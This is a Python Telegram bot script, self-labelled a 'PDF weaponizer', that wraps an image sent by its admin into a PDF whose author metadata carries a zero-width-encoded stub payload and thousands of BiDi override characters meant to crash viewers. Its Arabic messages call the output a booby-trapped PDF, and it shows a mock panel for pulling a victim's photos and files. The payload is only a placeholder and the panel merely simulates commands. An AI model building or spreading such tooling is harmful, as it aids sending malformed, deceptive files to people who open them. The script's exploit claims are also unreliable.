#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# ARCHITECT TELEGRAM PDF WEAPONIZER - RENDER EDITION (NO FLASK)
# ============================================================

import os
import io
import uuid
import logging
from PIL import Image
from reportlab.pdfgen import canvas
from reportlab.lib.utils import ImageReader
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ==============================================
# قراءة المتغيرات من البيئة
# ==============================================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))
PORT = int(os.environ.get("PORT", "10000"))
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "").rstrip('/')

if not BOT_TOKEN or ADMIN_ID == 0 or not WEBHOOK_URL:
    raise ValueError("❌ BOT_TOKEN, ADMIN_ID, and WEBHOOK_URL are required!")

# ==============================================
# Zero-Width + BiDi Exploit Generator
# ==============================================
ZW_MAP = {'0': '\u200b', '1': '\u200c', 'B': '\u200d', 'E': '\ufeff'}

def generate_crash_trap():
    rlo = '\u202e' * 4096
    lre = '\u202a' * 2048
    pdf_mark = '\u202c'
    return rlo + '[' * 1024 + lre + ']' * 1024 + pdf_mark

def binary_to_zero_width(data_bytes):
    bit_str = ''.join(format(b, '08b') for b in data_bytes)
    return ''.join(ZW_MAP[bit] for bit in bit_str) + ZW_MAP['E']

def generate_payload_stub():
    stub_hex = "DEADBEEF1337CAFE" * 4
    return bytes.fromhex(stub_hex)

def create_weaponized_pdf(image_bytes):
    img = Image.open(io.BytesIO(image_bytes))
    img_width, img_height = img.size
    
    pdf_buffer = io.BytesIO()
    page_width = min(img_width, 595)
    page_height = min(img_height, 842)
    c = canvas.Canvas(pdf_buffer, pagesize=(page_width, page_height))
    
    scale = min(page_width / img_width, page_height / img_height, 1.0)
    draw_width = img_width * scale
    draw_height = img_height * scale
    x_offset = (page_width - draw_width) / 2
    y_offset = (page_height - draw_height) / 2
    
    img_reader = ImageReader(img)
    c.drawImage(img_reader, x_offset, y_offset, width=draw_width, height=draw_height)
    
    stub = generate_payload_stub()
    hidden_payload = binary_to_zero_width(stub)
    crash_trap = generate_crash_trap()
    malicious_unicode = hidden_payload + crash_trap
    
    c.setAuthor(malicious_unicode)
    c.setTitle(f"DOC_{uuid.uuid4().hex[:6].upper()}")
    c.save()
    pdf_buffer.seek(0)
    return pdf_buffer

# ==============================================
# Telegram Bot Handlers
# ==============================================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ غير مصرح.")
        return
    await update.message.reply_text("🖤 *جاهز سيدي المطور.*\n\n⚡ *الوحش يعمل*\n\n📸 *أرسل صورة لتحويلها إلى PDF ملغوم.*", parse_mode='Markdown')

async def handle_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    wait_msg = await update.message.reply_text("🔄 *جاري بناء PDF الملغوم...*", parse_mode='Markdown')
    try:
        photo_file = await update.message.photo[-1].get_file()
        img_bytes = await photo_file.download_as_bytearray()
        pdf_buffer = create_weaponized_pdf(bytes(img_bytes))
        await update.message.reply_document(
            document=pdf_buffer,
            filename=f"Document_{uuid.uuid4().hex[:6].upper()}.pdf",
            caption="💣 *PDF ملغوم جاهز.*\n\n⚠️ *للاستخدام الأمني المصرح به فقط.*",
            parse_mode='Markdown'
        )
        await wait_msg.delete()
    except Exception as e:
        await wait_msg.edit_text(f"❌ *خطأ:*\n`{str(e)}`", parse_mode='Markdown')

async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    keyboard = [
        [InlineKeyboardButton("📸 سحب الصور", callback_data="cmd_gallery")],
        [InlineKeyboardButton("📁 سحب الملفات", callback_data="cmd_files")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🐉 *لوحة تحكم الوحش*", reply_markup=reply_markup, parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("✅ تم إرسال الأمر (وضع المحاكاة).")

# ==============================================
# Initialize and Run with Webhook
# ==============================================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("panel", panel))
    app.add_handler(MessageHandler(filters.PHOTO, handle_image))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info(f"🚀 Starting webhook on port {PORT}")
    app.run_webhook(
        listen="0.0.0.0",
        port=PORT,
        url_path=BOT_TOKEN,
        webhook_url=f"{WEBHOOK_URL}/{BOT_TOKEN}"
    )

if __name__ == "__main__":
    main()
